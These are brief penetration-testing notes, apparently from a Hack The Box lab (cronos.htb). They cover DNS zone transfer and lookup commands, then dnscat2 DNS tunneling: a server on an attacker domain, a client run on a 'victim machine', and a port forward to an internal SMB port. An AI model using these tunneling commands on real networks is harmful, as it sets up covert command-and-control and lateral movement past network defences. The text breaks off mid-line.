Check the DNS server cache 
`host -l cronos.htb 10.10.10.13`
Dig
`dig hostname.htb`


### DNS Tunneling
#### DNSMasq & dnscat2

On Authority server:  `dnscat2-server feline.corp`
From victim machine: `./dnscat feline.corp`
	windows
		windows -i 1 
			`listen 127.0.0.1:4455 172.16.2.11:445`
			e